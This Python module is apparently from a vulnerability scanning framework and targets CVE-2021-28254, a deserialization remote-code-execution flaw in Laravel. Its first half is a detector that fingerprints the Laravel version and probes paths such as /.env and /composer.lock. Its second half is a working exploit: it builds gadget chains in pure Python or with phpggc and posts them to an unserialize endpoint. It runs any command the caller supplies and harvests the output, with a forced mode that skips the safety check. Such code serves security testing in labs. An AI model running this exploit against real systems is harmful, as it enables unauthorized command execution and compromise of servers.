#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import force_requested as _force_requested, metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2021-28254')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
r"""
CVE-2021-28254 — Laravel PendingBroadcast Deserialization RCE (SAFE DETECTOR)

Summary:
    Laravel <= 8.5.9 used a dangerous __destruct() inside
    Illuminate\Broadcasting\PendingBroadcast which could trigger
    untrusted deserialization → RCE.

This module performs ONLY SAFE DETECTION:

 ✔ Identifies Laravel version (HTML leaks, headers, debug output)
 ✔ Detects PendingBroadcast class leakage
 ✔ Detects vendor file exposure
 ✔ Detects composer.lock version
 ✔ NO payload execution, NO unsafe serialization

"""

import base64
import json
import re
import requests

from modules.core import http_config
from modules.probes.response_memo import get_run_memo, memo_key

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

LARAVEL_VERSION_PATTERN = re.compile(
    r"Laravel\s*v?(\d+\.\d+\.\d+)", re.IGNORECASE
)

PENDING_BROADCAST_PATTERN = re.compile(
    r"PendingBroadcast|Illuminate\\\\Broadcasting\\\\PendingBroadcast",
    re.IGNORECASE,
)


def _safe_get(sess, url, timeout=6):
    try:
        return sess.get(url, timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None


def _extract_version(text: str):
    if not text:
        return None
    m = LARAVEL_VERSION_PATTERN.search(text)
    return m.group(1) if m else None


def _normalize(v: str):
    try:
        parts = v.split(".")
        parts += ["0"] * (3 - len(parts))
        return tuple(int(p) for p in parts[:3])
    except:
        return None


def _is_vulnerable(version: str):
    """Laravel <= 8.5.9"""
    v = _normalize(version)
    if not v:
        return None
    return v <= _normalize("8.5.9")


def _parse_composer_lock_version(body):
    """Extract laravel/framework version from a composer.lock body (bytes or str).

    Shared by BOTH the memo-hit and real-fetch paths so a hit yields the SAME parse
    result the fetch would. Returns the cleaned version (v-prefix stripped) or None.
    """
    if body is None:
        return None
    if isinstance(body, (bytes, bytearray)):
        try:
            body = body.decode("utf-8", "replace")
        except Exception:
            return None
    try:
        data = json.loads(body)
    except Exception:
        return None
    if not data:
        return None
    for pkg in data.get("packages", []):
        if pkg.get("name") == "laravel/framework":
            ver = (pkg.get("version") or "").lstrip("v")
            if ver:
                return ver
    return None


def _probe_deserialize_sink(sess, base: str, timeout: int = 6) -> dict:
    endpoint = base + "/deserialize"
    probe_blob = b's:20:"CVE-2021-28254-probe";'
    payload = base64.b64encode(probe_blob).decode("ascii")
    try:
        resp = sess.post(
            endpoint,
            data=payload,
            headers={"Content-Type": "text/plain"},
            timeout=timeout,
            verify=False,
        )
    except Exception as exc:
        return {"state": "unknown", "endpoint": endpoint, "error": str(exc)}
    body = resp.text or ""
    if resp.status_code == 200 and ('"result"' in body or "string" in body):
        return {"state": "confirmed", "endpoint": endpoint, "status": resp.status_code}
    if resp.status_code in (400, 401, 403, 404, 405, 419):
        return {
            "state": "blocked",
            "endpoint": endpoint,
            "status": resp.status_code,
            "body_head": body[:180],
        }
    return {
        "state": "unknown",
        "endpoint": endpoint,
        "status": resp.status_code,
        "body_head": body[:180],
    }


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2021-28254",
        "name": "Laravel PendingBroadcast Deserialization RCE",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "version_status": "unknown",
        "evidence": [],
        "detection_methods": [],
    }

    # ---------------------------------------------------------
    # 1) Check main page for Laravel version leak
    # ---------------------------------------------------------
    main = _safe_get(sess, base)
    if main is not None and main.text:
        ver = _extract_version(main.text)
        if ver:
            result["version"] = ver
            result["detection_methods"].append("version_html")
            result["evidence"].append(f"Laravel version leak: {ver}")

    # ---------------------------------------------------------
    # 2) Check common version leak endpoints
    # ---------------------------------------------------------
    version_leak_eps = [
        "/_debugbar",
        "/_debugbar/assets/javascript",
        "/.env",
        "/",
    ]

    if not result["version"]:
        for ep in version_leak_eps:
            r = _safe_get(sess, base + ep)
            if r is None:
                continue

            ver = _extract_version(r.text)
            if ver:
                result["version"] = ver
                result["detection_methods"].append(f"version_leak:{ep}")
                result["evidence"].append(f"Version found at {ep}: {ver}")
                break

    # ---------------------------------------------------------
    # 3) composer.lock exposure
    # ---------------------------------------------------------
    if not result["version"]:
        # Read-through the within-run Response memo BEFORE fetching. Discovery
        # (detect_laravel._composer_version_signals) seeds the in-hand /composer.lock
        # Response keyed FAITHFULLY to its fetch params: GET, allow_redirects=True (the
        # _safe_get default both sides share), no injected headers, run auth-context. We
        # rebuild the IDENTICAL composite key here. app_url(base, "/composer.lock") is the
        # exact URL string the seeder fed into its key (== base + "/composer.lock" for a
        # normalized base). A HIT serves the seeded body (no second HTTP request); a MISS
        # returns None and we fall through to the existing _safe_get fetch UNCHANGED.
        ver = None
        composer_url = http_config.app_url(base, "/composer.lock")
        key = memo_key("GET", composer_url, allow_redirects=True,
                       headers={}, auth=http_config.run_auth_label())
        snap = get_run_memo().get(key)
        if snap is not None:
            # ANY hit avoids the fetch (the request the memo exists to save). Discovery
            # seeds non-200 composer.lock responses too (it put()s before its own status
            # check), so a seeded 404 — the common production case — must NOT re-fetch.
            # Only a 200 carries a parseable body; on a non-200 hit ver stays None, exactly
            # as a real fetch would yield.
            if snap.status == 200:
                ver = _parse_composer_lock_version(snap.body)
        else:
            composer = _safe_get(sess, base + "/composer.lock")
            if composer is not None and composer.status_code == 200:
                ver = _parse_composer_lock_version(composer.content)

        if ver:
            result["version"] = ver
            result["detection_methods"].append("composer_lock")
            result["evidence"].append(f"composer.lock version: {ver}")

    # ---------------------------------------------------------
    # 4) Detect PendingBroadcast class leakage (debug errors)
    # ---------------------------------------------------------
    debug_endpoints = [
        "/broadcasting/auth",
        "/?force_error=1",
        "/debug",
    ]

    for ep in debug_endpoints:
        r = _safe_get(sess, base + ep)
        if r is not None and PENDING_BROADCAST_PATTERN.search(r.text or ""):
            result["status"] = "surface_present"
            result["verdict"] = "surface_present"
            result["proof_type"] = "error_fingerprint"
            result["detection_methods"].append(f"class_leak:{ep}")
            result["evidence"].append("PendingBroadcast class visible in response")
            break

    # ---------------------------------------------------------
    # 5) Vendor file exposed
    # ---------------------------------------------------------
    vendor_url = (
        base
        + "/vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php"
    )
    vendor = _safe_get(sess, vendor_url)
    if vendor is not None and vendor.status_code == 200 and "__destruct" in vendor.text:
        if result["verdict"] == "not_detected":
            result["status"] = "surface_present"
            result["verdict"] = "surface_present"
            result["proof_type"] = "source_disclosure"
        result["detection_methods"].append("vendor_file_exposed")
        result["evidence"].append("Exposed PendingBroadcast.php")

    # ---------------------------------------------------------
    # 6) Version-based vulnerability result
    # ---------------------------------------------------------
    if result["version"]:
        if _is_vulnerable(result["version"]):
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            result["version_status"] = "vulnerable"
            sink = _probe_deserialize_sink(sess, base)
            result.setdefault("artifacts", {})["deserialize_sink_probe"] = sink
            result["detection_methods"].append("deserialize_sink_probe")
            if sink.get("state") == "confirmed":
                result["vulnerable"] = True
                result["status"] = "confirmed_vulnerable"
                result["verdict"] = "confirmed_vulnerable"
                result["proof_type"] = "safe_active"
                result["evidence"].append(
                    "POST /deserialize accepted a benign serialized string and returned an unserialize() result"
                )
            elif sink.get("state") == "blocked":
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "deserialize_sink_control"
                result["version_status"] = "vulnerable version, deserialize sink blocked"
                result["evidence"].append(
                    f"Laravel version is in range, but /deserialize rejected the serialized probe "
                    f"(HTTP {sink.get('status')}); no reachable unsafe unserialize() sink confirmed"
                )
        else:
            result["version_status"] = "patched"
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
            # FP fix (audit 2026-06-05): a resolved, patched framework version is
            # AUTHORITATIVE — it MUST override any earlier vulnerable=True that Steps 4/5
            # set merely on source/class disclosure. Reading PendingBroadcast.php source
            # (it contains __destruct on EVERY Laravel) is NOT a reachable attacker-controlled
            # unserialize sink. Downgrade those to informational evidence; the verdict is clean.
            if result["vulnerable"]:
                result["vulnerable"] = False
                result["evidence"].append(
                    "version is patched (> 8.5.9): class/source disclosure above is "
                    "informational only, NOT a reachable unserialize sink"
                )
    else:
        result["version_status"] = "unknown"

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2021-28254 exploitation half — Laravel PendingBroadcast __destruct POP-chain RCE.

Split from the original modules/cve_2021_28254.py (detection half: modules/cves/cve_2021_28254.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# ---------------------------------------------------------------------------
# Exploit: CVE-2021-28254  (Laravel PendingBroadcast __destruct POP-chain RCE)
# ---------------------------------------------------------------------------
# Class: deserialize_rce (command-capable). CVE-2021-28254 is a POP *gadget
# chain* in laravel/framework (<= 8.5.9; the PendingBroadcast __destruct gadget
# is present unchanged across the affected line). The lab installs a genuine
# in-range Laravel 8.4.x. The framework
# never unserializes HTTP input itself; exploitation requires an application
# unserialize() sink. The lab ships that contrived sink at POST /deserialize
# (base64-encoded serialized body) -- the gadget fires system(CMD) during
# unserialize() and the command output is emitted into the HTTP response body.
#
# Delivery is 100% pure HTTP (requests). The ONLY non-HTTP step is generating
# the serialized POP chain, which requires phpggc + a local `php` CLI. Per the
# exploit contract the module NEVER shells into docker; it uses a local `php`
# if present, or a caller-supplied pre-built payload via options. When neither is
# available it returns success=False and requires=["phpggc"]. The matching
# minimal gadget/app-sink harness lives at
# `vuln-labs/framework/laravel/8.5.9/cve-2021-28254_pendingbroadcast-deser_39008-40008`.

# Laravel RCE gadget chains to try (cleanest-first). The try-each-then-key-on-
# reflected-command-output APPROACH is framework-build agnostic across the
# affected 8.x line, so a chain that doesn't fire on one build falls through to
# the next (the genuine in-range 8.4.x lab runtime is covered by this fallback).
# RCE14/RCE11/RCE16 fire system(CMD) during __destruct and return cleanly;
# RCE9/RCE13/RCE15 also pop but throw afterward (output still captured).
_CANDIDATE_CHAINS = [
    "Laravel/RCE14", "Laravel/RCE11", "Laravel/RCE16",
    "Laravel/RCE9", "Laravel/RCE13", "Laravel/RCE15",
]
_RCE_SUCCESS_MARKERS = ("uid=", "gid=", "groups=", "Linux", "GNU/Linux")


def _extract_rce_output(body: str, max_lines: int = 12, max_chars: int = 4000) -> str:
    """Extract the FULL reflected command-output block from a deserialize response.

    The success GATE keys on _RCE_SUCCESS_MARKERS (uid=/gid=/...), but the EVIDENCE must
    include the whole output of `--command`, not just the marker lines. For the default
    CVE-labeled proof command, the `id` line matches a marker while the hostname line does NOT
    — the previous "keep only marker-matching lines" logic dropped it. This mirrors the rce
    module (CVE-2020-19316): anchor on the first marker line, then capture it plus the
    following contiguous output lines (so uid AND hostname are both surfaced).

    Returns the captured block (trimmed/capped), or "" if no marker line is present.
    """
    lines = (body or "").splitlines()
    start = next((i for i, ln in enumerate(lines)
                  if any(m in ln for m in _RCE_SUCCESS_MARKERS)), None)
    if start is None:
        return ""
    block = []
    for ln in lines[start:]:
        s = ln.strip()
        # Stop at the first blank line AFTER we've captured the marker line(s) + output —
        # the reflected command output is a contiguous run; trailing HTML/markup is separated
        # by blank lines or starts a tag. Keep non-empty lines that aren't obvious HTML.
        if not s:
            if block:
                break
            continue
        if s.startswith("<") and block:
            break
        block.append(s)
        if len(block) >= max_lines:
            break
    return "\n".join(block)[:max_chars]


def _locate_phpggc(options):
    """Resolve a (php_argv, phpggc_path, phpggc_dir) tuple using ONLY a local
    php CLI -- never docker (per the exploit contract this module never shells
    into a container). Returns None if no usable (php, phpggc) pair is found.

    Resolution order for the phpggc dir:
      1) options["phpggc"]      (direct path to the phpggc script)
      2) options["phpggc_dir"]  (dir containing the phpggc script)
      3) `phpggc` on PATH
    """
    import os
    import shutil

    if not shutil.which("php"):
        return None
    php = ["php"]
    opts = options or {}

    cand_script = opts.get("phpggc")
    if cand_script and os.path.isfile(cand_script):
        return php, cand_script, os.path.dirname(os.path.abspath(cand_script))

    cand_dirs = []
    if opts.get("phpggc_dir"):
        cand_dirs.append(opts["phpggc_dir"])

    for d in cand_dirs:
        script = os.path.join(d, "phpggc")
        if os.path.isfile(script):
            return php, script, d

    onpath = shutil.which("phpggc")
    if onpath:
        return php, onpath, os.path.dirname(os.path.abspath(onpath))

    return None


def _gen_serialized(php, phpggc, phpggc_dir, chain, cmd):
    """Build a serialized POP chain for `chain` running system(cmd) via phpggc.
    Returns raw serialized bytes, or raises on failure."""
    import subprocess
    out = subprocess.run(
        [*php, "-d", "phar.readonly=0", phpggc, chain, "system", cmd],
        capture_output=True, cwd=phpggc_dir,
    )
    if out.returncode != 0 or not out.stdout.strip():
        raise RuntimeError(
            "phpggc failed: " + (out.stderr.decode(errors="replace")[:300] or "no output"))
    # The serialized blob carries no trailing whitespace; strip a possible TTY newline.
    return out.stdout.strip()


def _post_deserialize(session, endpoint, serialized_bytes, timeout=20):
    """base64-encode the serialized payload and POST the raw b64 to /deserialize."""
    import base64
    b64 = base64.b64encode(serialized_bytes).decode()
    return session.post(endpoint, data=b64,
                        headers={"Content-Type": "text/plain"}, timeout=timeout)


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt real RCE against a CVE-2021-28254 (PendingBroadcast POP) target.

    Pure-HTTP delivery: a phpggc-generated Laravel POP chain is base64-encoded
    and POSTed to the application's unserialize() sink (POST /deserialize); the
    gadget runs system(command) during unserialize() and the output is reflected
    in the HTTP response. Returns the standard exploit contract dict; never
    raises to the caller. username/password are ignored (unauthenticated sink).

    options (all optional):
      {"chain": "Laravel/RCE14",        # pin a phpggc gadget chain
       "endpoint": "/deserialize",      # the application unserialize() sink path
       "phpggc": "/path/to/phpggc",     # direct path to the phpggc script
       "phpggc_dir": "/path/to/dir",    # dir containing the phpggc script
       "payload_file": "/path/to/blob", # pre-built RAW serialized payload (skips phpggc)
       "payload_b64": "...base64..."}   # pre-built serialized payload, base64 (skips phpggc)
    """
    result = {
        "cve": "CVE-2021-28254",
        "attempted": True,
        "success": False,
        "vuln_class": "deserialize_rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    if not target_url:
        result["attempted"] = False
        result["reason"] = "no target_url provided"
        return result

    try:
        import os
        import base64

        opts = options or {}
        forced = _force_requested(opts, **kwargs)
        cmd = command or "echo CVE-2021-28254 PoC && id && hostname"
        sink_path = opts.get("endpoint", "/deserialize")

        url = target_url
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        url = url.rstrip("/")
        endpoint = url + sink_path

        result["artifacts"]["endpoint"] = endpoint
        result["artifacts"]["command"] = cmd

        sess = session or http_config.get_auth_session()
        sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2021-28254"})

        # --- 0. Confirm the unserialize() sink is live (benign serialized string) ----
        # PHP `serialize("CVE-2021-28254-probe")` -> the route returns gettype/get_class
        # of the unserialized value, proving it actually deserializes the body.
        probe_blob = b's:20:"CVE-2021-28254-probe";'
        try:
            probe = _post_deserialize(sess, endpoint, probe_blob, timeout=15)
        except Exception as e:
            result["reason"] = f"target unreachable: {e}"
            result["requires"] = ["reachable_target"]
            return result

        ptext = probe.text or ""
        if probe.status_code == 200 and ('"result"' in ptext or "string" in ptext):
            result["artifacts"]["sink_confirmed"] = True
        else:
            result["artifacts"]["sink_probe_failed"] = {
                "status": probe.status_code,
                "body_head": ptext[:300],
                "forced": forced,
            }
            if not forced:
                result["reason"] = (
                    f"unserialize() sink at {sink_path} did not respond as expected "
                    f"(HTTP {probe.status_code}); the target may not expose the contrived "
                    f"deserialization route (CVE-2021-28254 needs an application sink).")
                result["requires"] = ["deserialize_sink"]
                result["evidence"] = ptext[:300]
                return result
            result["detail"] = (
                f"forced mode: benign sink probe failed with HTTP {probe.status_code}; "
                "continuing to deliver candidate POP payloads and requiring command-output proof"
            )

        # --- 1a. PURE-PYTHON gadget (no php/phpggc) — the primary path ----------------
        # Build the POP chain in-process with modules/php_gadgets (byte-identical to phpggc,
        # gated by tests/test_php_gadgets.py). This removes the phpggc/php dependency entirely.
        # RCE14 (Faker chain) is the cleanest on the 8.83.x lab; RCE9 (Bus\Dispatcher) is the
        # fallback. Only used when the caller did NOT pin a chain we don't have pure-Python.
        if not opts.get("payload_file") and not opts.get("payload_b64"):
            try:
                from modules.generators import php_gadgets as _pg
            except Exception:
                try:
                    import php_gadgets as _pg  # when modules/ is already on sys.path
                except Exception:
                    _pg = None
            if _pg is not None:
                _PURE_BUILDERS = (
                    ("Laravel/RCE14", _pg.build_rce14),
                    ("Laravel/RCE11", lambda c: _pg.build_rce11("system", c)),
                    ("Laravel/RCE16", _pg.build_rce16),
                    ("Laravel/RCE9", _pg.build_rce9),
                    ("Laravel/RCE13", _pg.build_rce13),
                    ("Laravel/RCE15", _pg.build_rce15),
                    ("Laravel/RCE12", lambda c: _pg.build_rce12("system", c)),
                )
                pure_chains = []
                pinned = opts.get("chain")
                for chain_name, builder in _PURE_BUILDERS:
                    if pinned in (None, chain_name):
                        try:
                            pure_chains.append((chain_name, builder(cmd)))
                        except Exception as e:
                            result.setdefault("artifacts", {}).setdefault("pure_python_errors", {})[
                                chain_name
                            ] = f"{type(e).__name__}: {e}"
                last_pure = ""
                for chain_name, blob in pure_chains:
                    try:
                        r = _post_deserialize(sess, endpoint, blob)
                    except requests.RequestException as e:
                        result["reason"] = f"POST {sink_path} failed: {e}"
                        return result
                    last_pure = r.text or ""
                    if any(m in last_pure for m in _RCE_SUCCESS_MARKERS):
                        result["success"] = True
                        result["evidence"] = _extract_rce_output(last_pure) or last_pure[:500]
                        result["detail"] = (
                            f"Unauthenticated deserialization RCE via PendingBroadcast POP chain "
                            f"(pure-Python {chain_name}, no phpggc); system({cmd!r}) output "
                            f"reflected in HTTP response.")
                        result["artifacts"]["chain"] = chain_name
                        result["artifacts"]["gadget_source"] = "pure-python (modules/php_gadgets)"
                        return result
                # Pure-Python chains delivered but didn't surface output — fall through to
                # phpggc/prebuilt (a different framework build may need another chain).
                if last_pure:
                    result["artifacts"]["pure_python_tried"] = [c for c, _ in pure_chains]

        # --- 1b. Obtain the serialized POP-chain bytes (prebuilt / phpggc) ------------
        # Pre-built payload paths (let the module run with no local php).
        prebuilt = None
        chains = [opts["chain"]] if opts.get("chain") else list(_CANDIDATE_CHAINS)

        pf = opts.get("payload_file")
        if pf and os.path.isfile(pf):
            with open(pf, "rb") as fh:
                prebuilt = fh.read().strip()
            result["artifacts"]["payload_source"] = f"prebuilt_file:{pf}"
        elif opts.get("payload_b64"):
            try:
                prebuilt = base64.b64decode(opts["payload_b64"])
                result["artifacts"]["payload_source"] = "prebuilt_b64"
            except Exception as e:
                result["reason"] = f"options['payload_b64'] is not valid base64: {e}"
                return result

        if prebuilt is not None:
            # A caller-supplied pre-built payload (already encodes a fixed command).
            try:
                r = _post_deserialize(sess, endpoint, prebuilt)
            except requests.RequestException as e:
                result["reason"] = f"POST {sink_path} failed: {e}"
                return result
            body = r.text or ""
            if any(m in body for m in _RCE_SUCCESS_MARKERS):
                result["success"] = True
                result["evidence"] = _extract_rce_output(body) or body[:500]
                result["detail"] = ("Unauthenticated deserialization RCE via PendingBroadcast "
                                     "POP chain (pre-built payload); command output reflected "
                                     "in HTTP response.")
                return result
            result["reason"] = ("pre-built payload POSTed but no command output surfaced; the "
                                "payload chain may not match the installed framework.")
            result["evidence"] = body[:500]
            result["requires"] = ["matching_gadget_chain"]
            return result

        # No pre-built payload: generate with a local php + phpggc (never docker).
        located = _locate_phpggc(opts)
        if not located:
            result["reason"] = (
                "POP-chain generation requires a local `php` CLI + phpggc, which is "
                "unavailable on this host; pure-HTTP delivery cannot proceed without the "
                "serialized gadget. The unserialize() sink IS confirmed live. Provide "
                "options={'payload_b64': ...} / {'payload_file': ...} with a pre-built "
                "Laravel POP chain (e.g. generated by phpggc elsewhere).")
            result["requires"] = ["phpggc"]
            return result
        php, phpggc, phpggc_dir = located
        result["artifacts"]["phpggc_dir"] = phpggc_dir

        # --- 2. Try each candidate chain: generate -> POST -> look for cmd output ----
        last_body = ""
        for chain in chains:
            try:
                serialized = _gen_serialized(php, phpggc, phpggc_dir, chain, cmd)
            except Exception:
                continue
            try:
                r = _post_deserialize(sess, endpoint, serialized)
            except requests.RequestException as e:
                result["reason"] = f"POST {sink_path} failed: {e}"
                return result
            last_body = r.text or ""
            if any(m in last_body for m in _RCE_SUCCESS_MARKERS):
                result["success"] = True
                result["evidence"] = _extract_rce_output(last_body) or last_body[:500]
                result["detail"] = (f"Unauthenticated deserialization RCE via PendingBroadcast "
                                     f"POP chain (chain={chain}); system({cmd!r}) output "
                                     f"reflected in HTTP response.")
                result["artifacts"]["chain"] = chain
                return result

        result["reason"] = (
            "all candidate POP chains were delivered to the live sink but none produced "
            "visible command output; the installed framework build may not match any tried "
            "gadget (pin one with options={'chain': 'Laravel/RCEn'}).")
        result["evidence"] = (last_body or "")[:500]
        result["requires"] = ["matching_gadget_chain"]
        return result

    except Exception as e:
        result["reason"] = f"exploit error: {e}"
        return result
